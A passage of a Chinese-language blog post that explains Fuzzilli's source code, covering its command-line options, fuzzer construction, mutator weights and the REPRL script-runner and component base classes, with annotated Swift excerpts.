swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">// Helper function that prints out an error message, then exits the process.</span><br><span class="hljs-keyword">func</span> <span class="hljs-title function_">configError</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">msg</span>: <span class="hljs-type">String</span>) -&gt; <span class="hljs-type">Never</span> &#123;<br>    <span class="hljs-built_in">print</span>(msg)<br>    exit(<span class="hljs-operator">-</span><span class="hljs-number">1</span>)<br>&#125;<br><br><span class="hljs-keyword">let</span> jsShellPath <span class="hljs-operator">=</span> args[<span class="hljs-number">0</span>]<br><br><span class="hljs-keyword">if</span> <span class="hljs-operator">!</span><span class="hljs-type">FileManager</span>.default.fileExists(atPath: jsShellPath) &#123;<br>    configError(<span class="hljs-string">&quot;Invalid JS shell path <span class="hljs-subst">\&quot;</span><span class="hljs-subst">\(jsShellPath)</span><span class="hljs-subst">\&quot;</span>, file does not exist&quot;</span>)<br>&#125;<br><br><span class="hljs-keyword">var</span> profile: <span class="hljs-type">Profile</span>! <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> val <span class="hljs-operator">=</span> args[<span class="hljs-string">&quot;--profile&quot;</span>], <span class="hljs-keyword">let</span> p <span class="hljs-operator">=</span> profiles[val] &#123;<br>    profile <span class="hljs-operator">=</span> p<br>&#125;<br><span class="hljs-keyword">if</span> profile <span class="hljs-operator">==</span> <span class="hljs-literal">nil</span> &#123;<br>    configError(<span class="hljs-string">&quot;Please provide a valid profile with --profile=profile_name. Available profiles: <span class="hljs-subst">\(profiles.keys)</span>&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>看下其中几个参数：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-operator">--</span>profile<span class="hljs-operator">=</span>name ： 选择一个预配置文件，根据要fuzz的js引擎来选择，对应的配置文件名字在<span class="hljs-type">Profile</span>.swift中，配置文件在<span class="hljs-type">FuzzilliCli</span><span class="hljs-operator">/</span><span class="hljs-type">Profiles中</span><br><span class="hljs-operator">--</span>jobs ： 这个是fuzzer开启的线程数，默认是<span class="hljs-number">1</span><br><span class="hljs-operator">--</span>engine ： 这个是fuzz引擎，默认是突变引擎<br><span class="hljs-operator">--</span>corpus ： 这个是语料库调度器，默认是basic，还有markov可选<br><span class="hljs-operator">--</span>consecutiveMutations ： 这个是每个样本的连续突变次数，默认是<span class="hljs-number">5</span>次<br><span class="hljs-operator">--</span>storagePath ： 这个是输出文件保存的路径，比如发现的crash和生成的语料<br><span class="hljs-operator">--</span>resume ： 如果上面storage path存在，就从storage path下的文件夹中的程序导入语料库，从而可以继续上次的fuzz<br><span class="hljs-operator">--</span>overwrite ： 如果storage path存在，就将其下面的程序删除，从头开始一次新的fuzz<br><span class="hljs-operator">--</span>importCorpusAll ： 这个是从给定的path中导入所有在路径下的程序当作初始语料库，这些语料都是protobuf是形式<br><span class="hljs-operator">--</span>importCorpusNewCov ： 这个是仅导入增加了代码覆盖率的语料<br><br></code></pre></td></tr></table></figure><h2 id="参数获取"><a href="#参数获取" class="headerlink" title="参数获取"></a>参数获取</h2><p>下面就是从命令行中获取对应的参数值，如果没有用户没有提供参数值就使用对应的默认值：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">let</span> numJobs <span class="hljs-operator">=</span> args.int(for: <span class="hljs-string">&quot;--jobs&quot;</span>) <span class="hljs-operator">??</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">let</span> logLevelName <span class="hljs-operator">=</span> args[<span class="hljs-string">&quot;--logLevel&quot;</span>] <span class="hljs-operator">??</span> <span class="hljs-string">&quot;info&quot;</span><br><span class="hljs-keyword">let</span> engineName <span class="hljs-operator">=</span> args[<span class="hljs-string">&quot;--engine&quot;</span>] <span class="hljs-operator">??</span> <span class="hljs-string">&quot;mutation&quot;</span><br><span class="hljs-keyword">let</span> corpusName <span class="hljs-operator">=</span> args[<span class="hljs-string">&quot;--corpus&quot;</span>] <span class="hljs-operator">??</span> <span class="hljs-string">&quot;basic&quot;</span><br><span class="hljs-keyword">let</span> numIterations <span class="hljs-operator">=</span> args.int(for: <span class="hljs-string">&quot;--numIterations&quot;</span>) <span class="hljs-operator">??</span> <span class="hljs-operator">-</span><span class="hljs-number">1</span><br><span class="hljs-keyword">let</span> timeout <span class="hljs-operator">=</span> args.int(for: <span class="hljs-string">&quot;--timeout&quot;</span>) <span class="hljs-operator">??</span> <span class="hljs-number">250</span><br><span class="hljs-keyword">let</span> minMutationsPerSample <span class="hljs-operator">=</span> args.int(for: <span class="hljs-string">&quot;--minMutationsPerSample&quot;</span>) <span class="hljs-operator">??</span> <span class="hljs-number">25</span><br><span class="hljs-keyword">let</span> minCorpusSize <span class="hljs-operator">=</span> args.int(for: <span class="hljs-string">&quot;--minCorpusSize&quot;</span>) <span class="hljs-operator">??</span> <span class="hljs-number">1000</span><br><span class="hljs-keyword">let</span> maxCorpusSize <span class="hljs-operator">=</span> args.int(for: <span class="hljs-string">&quot;--maxCorpusSize&quot;</span>) <span class="hljs-operator">??</span> <span class="hljs-type">Int</span>.max<br><span class="hljs-keyword">let</span> markovDropoutRate <span class="hljs-operator">=</span> args.double(for: <span class="hljs-string">&quot;--markovDropoutRate&quot;</span>) <span class="hljs-operator">??</span> <span class="hljs-number">0.10</span><br><span class="hljs-keyword">let</span> consecutiveMutations <span class="hljs-operator">=</span> args.int(for: <span class="hljs-string">&quot;--consecutiveMutations&quot;</span>) <span class="hljs-operator">??</span> <span class="hljs-number">5</span><br><span class="hljs-keyword">let</span> minimizationLimit <span class="hljs-operator">=</span> args.double(for: <span class="hljs-string">&quot;--minimizationLimit&quot;</span>) <span class="hljs-operator">??</span> <span class="hljs-number">0.0</span><br><span class="hljs-keyword">let</span> storagePath <span class="hljs-operator">=</span> args[<span class="hljs-string">&quot;--storagePath&quot;</span>]<br><span class="hljs-keyword">var</span> resume <span class="hljs-operator">=</span> args.has(<span class="hljs-string">&quot;--resume&quot;</span>)<br><span class="hljs-keyword">let</span> overwrite <span class="hljs-operator">=</span> args.has(<span class="hljs-string">&quot;--overwrite&quot;</span>)<br><span class="hljs-keyword">let</span> exportStatistics <span class="hljs-operator">=</span> args.has(<span class="hljs-string">&quot;--exportStatistics&quot;</span>)<br><span class="hljs-keyword">let</span> statisticsExportInterval <span class="hljs-operator">=</span> args.uint(for: <span class="hljs-string">&quot;--statisticsExportInterval&quot;</span>) <span class="hljs-operator">??</span> <span class="hljs-number">10</span><br><span class="hljs-keyword">let</span> corpusImportAllPath <span class="hljs-operator">=</span> args[<span class="hljs-string">&quot;--importCorpusAll&quot;</span>]<br><span class="hljs-keyword">let</span> corpusImportCovOnlyPath <span class="hljs-operator">=</span> args[<span class="hljs-string">&quot;--importCorpusNewCov&quot;</span>]<br><span class="hljs-keyword">let</span> corpusImportMergePath <span class="hljs-operator">=</span> args[<span class="hljs-string">&quot;--importCorpusMerge&quot;</span>]<br><span class="hljs-keyword">let</span> instanceType <span class="hljs-operator">=</span> args[<span class="hljs-string">&quot;--instanceType&quot;</span>] <span class="hljs-operator">??</span> <span class="hljs-string">&quot;standalone&quot;</span><br><span class="hljs-keyword">let</span> corpusSyncMode <span class="hljs-operator">=</span> args[<span class="hljs-string">&quot;--corpusSyncMode&quot;</span>] <span class="hljs-operator">??</span> <span class="hljs-string">&quot;full&quot;</span><br><span class="hljs-keyword">let</span> dontFuzz <span class="hljs-operator">=</span> args.has(<span class="hljs-string">&quot;--dontFuzz&quot;</span>)<br><span class="hljs-keyword">let</span> diagnostics <span class="hljs-operator">=</span> args.has(<span class="hljs-string">&quot;--diagnostics&quot;</span>)<br><span class="hljs-keyword">let</span> inspect <span class="hljs-operator">=</span> args[<span class="hljs-string">&quot;--inspect&quot;</span>]<br><span class="hljs-keyword">let</span> swarmTesting <span class="hljs-operator">=</span> args.has(<span class="hljs-string">&quot;--swarmTesting&quot;</span>)<br><span class="hljs-keyword">let</span> randomizingArguments <span class="hljs-operator">=</span> args.has(<span class="hljs-string">&quot;--argumentRandomization&quot;</span>)<br></code></pre></td></tr></table></figure><p>接着就是对参数的合规性进行判断，这部分代码就省略了</p><p>下面这部分就是获取各个代码生成器的权重，目前下面的代码生成器定义在CodeGenerators.swift文件中，各个代码生成器的权重定义在CodeGeneratorWeight.swift文件中：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">let</span> disabledGenerators <span class="hljs-operator">=</span> <span class="hljs-type">Set</span>(profile.disabledCodeGenerators)<br><span class="hljs-keyword">let</span> additionalCodeGenerators <span class="hljs-operator">=</span> profile.additionalCodeGenerators<br><span class="hljs-keyword">let</span> regularCodeGenerators: [(<span class="hljs-type">CodeGenerator</span>, <span class="hljs-type">Int</span>)] <span class="hljs-operator">=</span> <span class="hljs-type">CodeGenerators</span>.map &#123;<br>    <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> weight <span class="hljs-operator">=</span> codeGeneratorWeights[<span class="hljs-variable">$0</span>.name] <span class="hljs-keyword">else</span> &#123;<br>        logger.fatal(<span class="hljs-string">&quot;Missing weight for code generator <span class="hljs-subst">\(<span class="hljs-variable">$0</span>.name)</span> in CodeGeneratorWeights.swift&quot;</span>)<br>    &#125;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-variable">$0</span>, weight)<br>&#125;<br><span class="hljs-keyword">var</span> codeGenerators: <span class="hljs-type">WeightedList</span>&lt;<span class="hljs-type">CodeGenerator</span>&gt; <span class="hljs-operator">=</span> <span class="hljs-type">WeightedList</span>&lt;<span class="hljs-type">CodeGenerator</span>&gt;([])<br><br><span class="hljs-keyword">for</span> (generator, <span class="hljs-keyword">var</span> weight) <span class="hljs-keyword">in</span> (additionalCodeGenerators <span class="hljs-operator">+</span> regularCodeGenerators) &#123;<br>    <span class="hljs-keyword">if</span> disabledGenerators.contains(generator.name) &#123;<br>        <span class="hljs-keyword">continue</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> swarmTesting &#123;<br>        weight <span class="hljs-operator">=</span> <span class="hljs-type">Int</span>.random(in: <span class="hljs-number">1</span><span class="hljs-operator">...</span><span class="hljs-number">30</span>)<br>        logger.info(<span class="hljs-type">String</span>(format: <span class="hljs-string">&quot;%6d | <span class="hljs-subst">\(generator.name)</span>&quot;</span>, weight))<br>    &#125;<br><br>    codeGenerators.append(generator, withWeight: weight)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="构建Fuzzer"><a href="#构建Fuzzer" class="headerlink" title="构建Fuzzer"></a>构建Fuzzer</h2><p>makeFuzzer函数先设置一些参数，最后调用Fuzzer的构造函数，下面主要提一下REPRL：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">func</span> <span class="hljs-title function_">makeFuzzer</span>(<span class="hljs-params">for</span> <span class="hljs-params">profile</span>: <span class="hljs-type">Profile</span>, <span class="hljs-params">with</span> <span class="hljs-params">configuration</span>: <span class="hljs-type">Configuration</span>) -&gt; <span class="hljs-type">Fuzzer</span> &#123;<br>    <span class="hljs-comment">// A script runner to execute JavaScript code in an instrumented JS engine.</span><br>    <span class="hljs-comment">// 下面首先是创建一个runner，runner是用来执行JS代码的，在fuzzilli中采用一个REPRL模式</span><br>    <span class="hljs-keyword">let</span> runner <span class="hljs-operator">=</span> <span class="hljs-type">REPRL</span>(executable: jsShellPath, processArguments: profile.getProcessArguments(randomizingArguments), processEnvironment: profile.processEnv)<br><span class="hljs-comment">// Fuzz引擎的选择是根据前面参数来选择的</span><br>    <span class="hljs-keyword">let</span> engine: <span class="hljs-type">FuzzEngine</span><br>    <span class="hljs-keyword">switch</span> engineName &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;hybrid&quot;</span>:<br>        engine <span class="hljs-operator">=</span> <span class="hljs-type">HybridEngine</span>(numConsecutiveMutations: consecutiveMutations)<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;multi&quot;</span>:<br>        <span class="hljs-keyword">let</span> mutationEngine <span class="hljs-operator">=</span> <span class="hljs-type">MutationEngine</span>(numConsecutiveMutations: consecutiveMutations)<br>        <span class="hljs-keyword">let</span> hybridEngine <span class="hljs-operator">=</span> <span class="hljs-type">HybridEngine</span>(numConsecutiveMutations: consecutiveMutations)<br>        <span class="hljs-keyword">let</span> engines <span class="hljs-operator">=</span> <span class="hljs-type">WeightedList</span>&lt;<span class="hljs-type">FuzzEngine</span>&gt;([<br>            (mutationEngine, <span class="hljs-number">1</span>),<br>            (hybridEngine, <span class="hljs-number">1</span>),<br>        ])<br>        engine <span class="hljs-operator">=</span> <span class="hljs-type">MultiEngine</span>(engines: engines, initialActive: hybridEngine, iterationsPerEngine: <span class="hljs-number">1000</span>)<br>    <span class="hljs-keyword">default</span>:<br>        engine <span class="hljs-operator">=</span> <span class="hljs-type">MutationEngine</span>(numConsecutiveMutations: consecutiveMutations)<br>    &#125;<br><br>    <span class="hljs-comment">// Program templates to use.</span><br>    <span class="hljs-comment">// 程序模版是根据对应js引擎的profile提供的，用户可以自定义</span><br>    <span class="hljs-keyword">var</span> programTemplates <span class="hljs-operator">=</span> profile.additionalProgramTemplates<br>    <span class="hljs-keyword">for</span> template <span class="hljs-keyword">in</span> <span class="hljs-type">ProgramTemplates</span> &#123;<br>        <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> weight <span class="hljs-operator">=</span> programTemplateWeights[template.name] <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Missing weight for program template <span class="hljs-subst">\(template.name)</span> in ProgramTemplateWeights.swift&quot;</span>)<br>            exit(<span class="hljs-operator">-</span><span class="hljs-number">1</span>)<br>        &#125;<br><br>        programTemplates.append(template, withWeight: weight)<br>    &#125;<br><br>    <span class="hljs-comment">// The environment containing available builtins, property names, and method names.</span><br>    <span class="hljs-comment">// JavaScript执行的环境</span><br>    <span class="hljs-keyword">let</span> environment <span class="hljs-operator">=</span> <span class="hljs-type">JavaScriptEnvironment</span>(additionalBuiltins: profile.additionalBuiltins, additionalObjectGroups: [])<br><br>    <span class="hljs-comment">// A lifter to translate FuzzIL programs to JavaScript.</span><br>    <span class="hljs-comment">// lifter是将FuzzIL中间语言转为JavaScript代码</span><br>    <span class="hljs-keyword">let</span> lifter <span class="hljs-operator">=</span> <span class="hljs-type">JavaScriptLifter</span>(prefix: profile.codePrefix,<br>                                  suffix: profile.codeSuffix,<br>                                  inliningPolicy: <span class="hljs-type">InlineOnlyLiterals</span>(),<br>                                  ecmaVersion: profile.ecmaVersion)<br><br>    <span class="hljs-comment">// The evaluator to score produced samples.</span><br>    <span class="hljs-comment">// 评估样本用的</span><br>    <span class="hljs-keyword">let</span> evaluator <span class="hljs-operator">=</span> <span class="hljs-type">ProgramCoverageEvaluator</span>(runner: runner)<br><br>    <span class="hljs-comment">// Corpus managing interesting programs that have been found during fuzzing.</span><br>    <span class="hljs-comment">// 管理语料库的方法</span><br>    <span class="hljs-keyword">let</span> corpus: <span class="hljs-type">Corpus</span><br>    <span class="hljs-keyword">switch</span> corpusName &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;basic&quot;</span>:<br>        corpus <span class="hljs-operator">=</span> <span class="hljs-type">BasicCorpus</span>(minSize: minCorpusSize, maxSize: maxCorpusSize, minMutationsPerSample: minMutationsPerSample)<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;markov&quot;</span>:<br>        corpus <span class="hljs-operator">=</span> <span class="hljs-type">MarkovCorpus</span>(covEvaluator: evaluator <span class="hljs-keyword">as</span> <span class="hljs-type">ProgramCoverageEvaluator</span>, dropoutRate: markovDropoutRate)<br>    <span class="hljs-keyword">default</span>:<br>        logger.fatal(<span class="hljs-string">&quot;Invalid corpus name provided&quot;</span>)<br>    &#125;<br><br>    <span class="hljs-comment">// Minimizer to minimize crashes and interesting programs.</span><br>    <span class="hljs-keyword">let</span> minimizer <span class="hljs-operator">=</span> <span class="hljs-type">Minimizer</span>()<br><br>    <span class="hljs-comment">/// The mutation fuzzer responsible for mutating programs from the corpus and evaluating the outcome.</span><br>    <span class="hljs-keyword">let</span> mutators <span class="hljs-operator">=</span> <span class="hljs-type">WeightedList</span>([<br>        (<span class="hljs-type">ExplorationMutator</span>(),              <span class="hljs-number">3</span>),<br>        (<span class="hljs-type">CodeGenMutator</span>(),                  <span class="hljs-number">2</span>),<br>        (<span class="hljs-type">SpliceMutator</span>(),                   <span class="hljs-number">2</span>),<br>        (<span class="hljs-type">InputMutator</span>(isTypeAware: <span class="hljs-literal">false</span>),  <span class="hljs-number">2</span>),<br>        (<span class="hljs-type">InputMutator</span>(isTypeAware: <span class="hljs-literal">true</span>),   <span class="hljs-number">1</span>),<br>        <span class="hljs-comment">// Can be enabled for experimental use, ConcatMutator is a limited version of CombineMutator</span><br>        <span class="hljs-comment">// (ConcatMutator(),                1),</span><br>        (<span class="hljs-type">OperationMutator</span>(),                <span class="hljs-number">1</span>),<br>        (<span class="hljs-type">CombineMutator</span>(),                  <span class="hljs-number">1</span>),<br>        (<span class="hljs-type">JITStressMutator</span>(),                <span class="hljs-number">1</span>),<br>    ])<br><br>    <span class="hljs-comment">// Construct the fuzzer instance.</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-type">Fuzzer</span>(configuration: config,<br>                  scriptRunner: runner,<br>                  engine: engine,<br>                  mutators: mutators,<br>                  codeGenerators: codeGenerators,<br>                  programTemplates: programTemplates,<br>                  evaluator: evaluator,<br>                  environment: environment,<br>                  lifter: lifter,<br>                  corpus: corpus,<br>                  minimizer: minimizer)<br>&#125;<br></code></pre></td></tr></table></figure><p>下面介绍Execution下的三个组件：</p><p><img src="/2024/05/01/Fuzzilli%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%901/image-20240831103923896.png"></p><h3 id="REPRL类"><a href="#REPRL类" class="headerlink" title="REPRL类"></a>REPRL类</h3><p>REPRL的部分定义，可以看到REPRL类继承自ComponentBase、ScriptRunner，关于机制后面再详细介绍</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">/// Read-Eval-Print-Reset-Loop: a script runner that reuses the same process for multiple</span><br><span class="hljs-comment">/// scripts, but resets the global state in between executions.</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">REPRL</span>: <span class="hljs-title class_">ComponentBase</span>, <span class="hljs-title class_">ScriptRunner</span> &#123;<br>    <span class="hljs-comment">/// Kill and restart the child process after this many script executions</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> maxExecsBeforeRespawn <span class="hljs-operator">=</span> <span class="hljs-number">1000</span><br><br>    <span class="hljs-comment">/// Commandline arguments for the executable</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">private(set)</span> <span class="hljs-keyword">var</span> processArguments: [<span class="hljs-type">String</span>]<br><br>    <span class="hljs-comment">/// Environment variables for the child process</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> env <span class="hljs-operator">=</span> [<span class="hljs-type">String</span>]()<br><br>    <span class="hljs-comment">/// Number of script executions since start of child process</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> execsSinceReset <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br><br>    <span class="hljs-comment">/// Number of execution failures since the last successfully executed program</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> recentlyFailedExecutions <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br><br>    <span class="hljs-comment">/// The opaque REPRL context used by the C library</span><br>    <span class="hljs-keyword">fileprivate</span> <span class="hljs-keyword">var</span> reprlContext: <span class="hljs-type">OpaquePointer</span>? <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span><br><br>    <span class="hljs-comment">/// Essentially counts the number of run() invocations</span><br>    <span class="hljs-keyword">fileprivate</span> <span class="hljs-keyword">var</span> lastExecId <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br><br>    <span class="hljs-comment">/// Buffer to hold scripts, this lets us debug issues that arise if</span><br>    <span class="hljs-comment">/// previous scripts corrupted any state which is discovered in</span><br>    <span class="hljs-comment">/// future executions. This is only used if diagnostics mode is enabled.</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> scriptBuffer <span class="hljs-operator">=</span> <span class="hljs-type">String</span>()<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">init</span>(<span class="hljs-params">executable</span>: <span class="hljs-type">String</span>, <span class="hljs-params">processArguments</span>: [<span class="hljs-type">String</span>], <span class="hljs-params">processEnvironment</span>: [<span class="hljs-params">String</span>: <span class="hljs-type">String</span>]) &#123;<br>        <span class="hljs-keyword">self</span>.processArguments <span class="hljs-operator">=</span> [executable] <span class="hljs-operator">+</span> processArguments<br>        <span class="hljs-keyword">super</span>.<span class="hljs-keyword">init</span>(name: <span class="hljs-string">&quot;REPRL&quot;</span>)<br><br>        <span class="hljs-keyword">for</span> (key, value) <span class="hljs-keyword">in</span> processEnvironment &#123;<br>            env.append(key <span class="hljs-operator">+</span> <span class="hljs-string">&quot;=&quot;</span> <span class="hljs-operator">+</span> value)<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>Component代表Fuzzer不可或缺的组件</p><p>看下ComponentBase类的部分定义，即基本组件类，其中有该组件名字，和该组件相关的Fuzzer。上面REPRL的初始化函数中也初始化其名字为REPRL。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">/// A fundamental part of the fuzzer without which it could not operate.</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">protocol</span> <span class="hljs-title class_">Component</span> &#123;<br>    <span class="hljs-keyword">func</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">with</span> <span class="hljs-params">fuzzer</span>: <span class="hljs-type">Fuzzer</span>)<br><br>    <span class="hljs-keyword">var</span> isInitialized: <span class="hljs-type">Bool</span> &#123; <span class="hljs-keyword">get</span> &#125;<br>&#125;<br><span class="hljs-comment">/// Superclass for components.</span><br><span class="hljs-comment">/// Provides child classes with access to the associated fuzzer instance and a logger instance.</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ComponentBase</span>: <span class="hljs-title class_">Component</span> &#123;<br>    <span class="hljs-comment">// Name of this component.</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> name: <span class="hljs-type">String</span><br><br>    <span class="hljs-comment">// Reference to the fuzzer instance that this component is associated with.</span><br>    <span class="hljs-keyword">weak</span> <span class="hljs-keyword">var</span> fuzzer: <span class="hljs-type">Fuzzer</span>!<br><br>    <span class="hljs-comment">// Logger for this component.</span><br>    <span class="hljs-keyword">let</span> logger: <span class="hljs-type">Logger</span><br><br>    <span class="hljs-comment">// Has this component been initialized and is thus associated with a fuzzer instance?</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">var</span> isInitialized: <span class="hljs-type">Bool</span> &#123;<br>        <span class="hljs-keyword">return</span> fuzzer <span class="hljs-operator">!=</span> <span class="hljs-literal">nil</span><br>    &#125;<br><br>    <span class="hljs-keyword">init</span>(<span class="hljs-params">name</span>: <span class="hljs-type">String</span>) &#123;<br>        <span class="hljs-keyword">self</span>.name <span class="hljs-operator">=</span> name<br>        <span class="hljs-keyword">self</span>.logger <span class="hljs-operator">=</span> <span class="hljs-type">Logger</span>(withLabel: name)<br>    &#125;<br>    <span class="hljs-comment">// Called during initialization of the fuzzer. This associates the component with the fuzzer.</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">with</span> <span class="hljs-params">fuzzer</span>: <span class="hljs-type">Fuzzer</span>) &#123;<br>        <span class="hljs-built_in">assert</span>(<span class="hljs-operator">!</span>isInitialized)<br>        <span class="hljs-keyword">self</span>.fuzzer <span class="hljs-operator">=</span> fuzzer<br>        initialize()<br>    &#125;<br><br>    <span 